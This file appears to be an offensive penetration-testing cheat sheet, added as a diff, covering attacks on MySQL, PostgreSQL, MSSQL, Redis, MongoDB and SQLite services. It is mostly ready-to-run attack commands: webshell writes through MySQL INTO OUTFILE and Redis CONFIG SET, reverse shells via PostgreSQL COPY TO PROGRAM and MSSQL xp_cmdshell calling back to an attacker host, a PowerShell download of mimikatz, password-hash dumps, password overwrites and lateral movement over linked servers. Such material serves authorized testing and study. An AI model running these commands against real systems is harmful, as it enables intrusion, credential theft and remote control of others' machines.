@@ -1,0 +1,128 @@
+^sql notes:Always check for default credentials on database services
+^sql notes:Use PortSwigger SQL injection cheat sheet for payload reference
+^sql notes:Try connecting to MySQL with empty password for root (XAMPP default)
+^sql notes:Enumerate database versions first to determine attack vectors
+^sql notes:List all databases, then tables, then dump credentials
+^sql notes:For MSSQL, attempt to enable xp_cmdshell for RCE
+^sql notes:For PostgreSQL, attempt COPY TO PROGRAM for RCE
+^sql notes:Redis often has no auth - check with redis-cli
+^sql notes:SQLite databases can be downloaded and analyzed locally
+^sql notes:Check for linked servers in MSSQL for lateral movement
+^sql notes:For MySQL, try reading files with LOAD_FILE if file_priv is enabled
+^sql notes:https://portswigger.net/web-security/sql-injection/cheat-sheet # SQL injection cheatsheet; kali-machine
+^Reminder:If MSSQL is discovered, connect and confirm banner/version/auth mode → run: MSSQL # 1
+^Reminder:If MSSQL auth works, enumerate databases/grants/users → run: MSSQL # 2
+^Reminder:If MSSQL privileges allow, test command execution (xp_cmdshell) → run: MSSQL # 3
+^Reminder:If MSSQL access may enable lateral movement, enumerate linked servers → run: MSSQL # 4
+^Reminder:If MySQL is discovered, connect and confirm version/privs → run: MySQL # 1
+^Reminder:If MySQL auth works, enumerate DBs/tables/grants → run: MySQL # 2
+^Reminder:If MySQL FILE functions are available, attempt file reads → run: MySQL # 3
+^Reminder:If PostgreSQL is discovered, connect and enumerate roles → run: PostgreSQL # 1
+^Reminder:If PostgreSQL auth works, enumerate DBs/tables → run: PostgreSQL # 2
+^Reminder:If PostgreSQL has superuser-like rights, attempt COPY TO PROGRAM RCE → run: PostgreSQL RCE # 1
+^Reminder:If PostgreSQL RCE attempt fails, try alternate COPY/program pattern → run: PostgreSQL RCE # 2
+^Reminder:If MongoDB is discovered, test unauth access and enumerate DBs/collections → run: MongoDB # 1
+^Reminder:If Redis is discovered, test unauth access and inspect config/keys → run: Redis # 1
+^Reminder:If Redis writable paths exist, evaluate file-write style attacks → run: Redis # 2
+^Reminder:If you acquire a SQLite DB file from loot, open and enumerate locally → run: SQLite # 1
+
+MySQL # 1:mysql -h <target> -P <port> -u <user> -p <password> # Connect to MySQL from Linux when you have credentials; kali-machine
+MySQL # 1:mysql -h <target> -P <port> -u root -p # Try connecting as root with password prompt. Try blank password first; kali-machine
+MySQL # 1:cd "C:\xampp\mysql\bin" # Change directory to XAMPP MySQL binaries; target-machine
+MySQL # 1:.\mysql -u root # Attempt local MySQL root (XAMPP often no password); target-machine
+MySQL # 1:.\mysql.exe -u<user> -p<password> -e 'show databases;' # Windows XAMPP connect and execute query; target-machine
+MySQL # 1:.\mysql.exe -u<user> -p<password> <database> -e 'show tables;' # Connect to specific database and list tables; target-machine
+MySQL # 2:select version(); # Get database version. Look for vulnerable versions; kali-machine
+MySQL # 2:select system_user(); # Get system user running database; kali-machine
+MySQL # 2:show databases; # List all databases. Look for interesting names; kali-machine
+MySQL # 2:use <database>; # Select database to work with; kali-machine
+MySQL # 2:show tables; # List tables in current database; kali-machine
+MySQL # 2:SELECT * FROM users; # Dump users table. Look for password hashes; kali-machine
+MySQL # 2:select * from mysql.user; # Dump database users with privileges; kali-machine
+MySQL # 2:select @@datadir; # Find data directory location; kali-machine
+MySQL # 2:select @@secure_file_priv; # Check directory where file read/write is allowed. NULL means disabled; kali-machine
+MySQL # 3:UPDATE administrators SET user_password='<password>' WHERE user_name='<user>'; # Update user password if you have write access; kali-machine
+MySQL # 3:SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'; # Write webshell if file_priv is enabled and path writable; kali-machine
+MySQL # 3:SELECT LOAD_FILE('/etc/passwd'); # Read system files if file_priv enabled; kali-machine
+MySQL # 3:SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts'); # Read Windows files if file_priv enabled; kali-machine
+
+PostgreSQL # 1:psql -h <target> -p <port> -U <user> -d <db_name> # Connect to PostgreSQL with credentials; kali-machine
+PostgreSQL # 1:psql -h <target> -p <port> -U postgres # Try default postgres user with no password; kali-machine
+PostgreSQL # 1:\l # List all databases; kali-machine
+PostgreSQL # 1:\c <dbname> # Connect to specific database; kali-machine
+PostgreSQL # 1:\dt # List tables in current database; kali-machine
+PostgreSQL # 1:\du # List database users and roles; kali-machine
+PostgreSQL # 2:SELECT version(); # Get database version; kali-machine
+PostgreSQL # 2:SELECT current_user; # Get current user; kali-machine
+PostgreSQL # 2:SELECT * FROM users; # Dump users table; kali-machine
+PostgreSQL # 2:SELECT * FROM pg_shadow; # Dump password hashes (requires superuser); kali-machine
+PostgreSQL # 2:UPDATE users SET password='<password>' WHERE username='<user>'; # Update user password; kali-machine
+PostgreSQL RCE # 1:COPY (SELECT '') TO PROGRAM 'whoami'; # Execute system command if superuser. Look for command output; kali-machine
+PostgreSQL RCE # 1:COPY (SELECT '') TO PROGRAM 'nc -e /bin/sh <kali> <kaliPort>'; # Reverse shell via COPY TO PROGRAM; kali-machine
+PostgreSQL RCE # 1:COPY (SELECT '') TO PROGRAM 'php /var/www/backend/default/uploads/php-reverse-shell.php'; # Execute PHP reverse shell; kali-machine
+PostgreSQL RCE # 1:COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<kali>/<kaliPort> 0>&1"'; # Alternative reverse shell; kali-machine
+PostgreSQL RCE # 2:CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE C STRICT; # Create system function if libc is accessible; kali-machine
+PostgreSQL RCE # 2:SELECT system('nc -e /bin/sh <kali> <kaliPort>'); # Execute command via custom function; kali-machine
+
+SQLite # 1:sqlite3 <filename1> # Connect to SQLite database file. Download file first if remote; kali-machine
+SQLite # 1:.tables # List all tables in database; kali-machine
+SQLite # 1:.schema # Dump database schema showing table structures; kali-machine
+SQLite # 1:SELECT * FROM sqlite_master; # Query master table for all objects; kali-machine
+SQLite # 1:SELECT * FROM users; # Query table contents; kali-machine
+SQLite # 1:SELECT * FROM sqlite_master WHERE type='table'; # List all tables; kali-machine
+SQLite # 1:.exit # Exit sqlite3 shell; kali-machine
+SQLite # 1:.dump # Dump entire database as SQL; kali-machine
+
+Redis # 1:redis-cli -h <target> # Connect to Redis. Often no authentication required; kali-machine
+Redis # 1:redis-cli -h <target> -a <password> # Connect with password if authentication required; kali-machine
+Redis # 1:INFO # Get Redis server information (version, OS, etc.); kali-machine
+Redis # 1:CONFIG GET * # Get all configuration settings; kali-machine
+Redis # 1:CONFIG GET dir # Get Redis working directory; kali-machine
+Redis # 1:CONFIG GET dbfilename # Get database filename; kali-machine
+Redis # 1:KEYS * # List all keys. Look for interesting data; kali-machine
+Redis # 1:GET <key> # Retrieve value for specific key; kali-machine
+Redis # 1:MGET <key1> <key2> <key3> # Get multiple keys at once; kali-machine
+Redis # 1:AUTH <password> # Authenticate to Redis; kali-machine
+
+Redis # 2:SET <key> "<value>" # Set key value if you have write access; kali-machine
+Redis # 2:CONFIG SET dir /var/www/html # Change working directory to web root for webshell upload; kali-machine
+Redis # 2:CONFIG SET dbfilename shell.php # Set filename to PHP file; kali-machine
+Redis # 2:SET payload "<?php system($_GET['cmd']); ?>" # Write PHP payload; kali-machine
+Redis # 2:SAVE # Save to disk, creating webshell; kali-machine
+
+MSSQL # 1:impacket-mssqlclient <user>:<password>@<target> -windows-auth # Connect via impacket with Windows authentication; kali-machine
+MSSQL # 1:impacket-mssqlclient <user>:<password>@<target> # Connect with SQL Server authentication; kali-machine
+MSSQL # 1:sqsh -S <target>:<port> -U <user> -P <password> # Connect via sqsh; kali-machine
+MSSQL # 1:python3 mssqlclient.py <user>:<password>@<target> # Alternative impacket syntax; kali-machine
+MSSQL # 2:SELECT @@version; # Get SQL Server version; kali-machine
+MSSQL # 2:SELECT name FROM master.dbo.sysdatabases; # List databases (legacy); kali-machine
+MSSQL # 2:SELECT name FROM sys.databases; # List databases (modern); kali-machine
+MSSQL # 2:SELECT user_name(); # Get current database user; kali-machine
+MSSQL # 2:SELECT system_user; # Get system user; kali-machine
+MSSQL # 2:EXEC sp_who2; # List current connections and users; kali-machine
+MSSQL # 2:SELECT name FROM master..syslogins; # List SQL Server logins; kali-machine
+MSSQL # 2:SELECT name, password_hash FROM master.sys.sql_logins; # Get password hashes (if sysadmin); kali-machine
+MSSQL # 2:SELECT is_srvrolemember('sysadmin'); # Check if current user is sysadmin; kali-machine
+MSSQL # 2:SELECT * FROM <database>.information_schema.tables; # List tables in database; kali-machine
+MSSQL # 2:SELECT * FROM <database>.dbo.<table>; # Dump table contents; kali-machine
+MSSQL # 2:SELECT * FROM users; # Dump users table from current DB; kali-machine
+MSSQL # 3:EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; # Enable xp_cmdshell (requires sysadmin); kali-machine
+MSSQL # 3:EXEC xp_cmdshell 'whoami'; # Test command execution. If successful, you have RCE; kali-machine
+MSSQL # 3:EXEC xp_cmdshell 'powershell -exec bypass -c "(New-Object Net.WebClient).DownloadFile(''http://<kali>:1234/mimikatz.exe'', ''C:\Windows\Tasks\mimikatz.exe'')"'; # Download binary via PowerShell; target-machine
+MSSQL # 3:EXEC xp_cmdshell 'C:\Windows\Temp\nc64.exe <kali> <kaliPort> -e cmd.exe'; # Reverse shell; kali-machine
+MSSQL # 3:EXEC xp_cmdshell 'powershell -e <base64>'; # Execute encoded PowerShell; kali-machine
+MSSQL # 3:EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; # Enable OLE automation for file operations; kali-machine
+MSSQL # 4:update users set password='<password>' where username='<user>'; # Overwrite user password if you have write access; kali-machine
+MSSQL # 4:EXEC sp_linkedservers; # List linked servers for lateral movement; kali-machine
+MSSQL # 4:SELECT * FROM OPENQUERY([<linked_server>], 'SELECT @@version'); # Query linked server; kali-machine
+MSSQL # 4:EXEC ('xp_cmdshell ''whoami''') AT [<linked_server>]; # Execute commands on linked server; kali-machine
+
+MongoDB # 1:mongosh --host <target> --port <port> # Connect to MongoDB; kali-machine
+MongoDB # 1:mongo --host <target> --port <port> # Legacy mongo shell; kali-machine
+MongoDB # 1:show dbs # List databases; kali-machine
+MongoDB # 1:use <db> # Switch to database; kali-machine
+MongoDB # 1:show collections # List collections (tables); kali-machine
+MongoDB # 1:db.getCollectionNames() # Alternative to list collections; kali-machine
+MongoDB # 1:db.users.find() # Dump users collection; kali-machine
+MongoDB # 1:db.admin.find() # Dump admin collection; kali-machine
+MongoDB # 1:db.system.users.find() # List database users; kali-machine
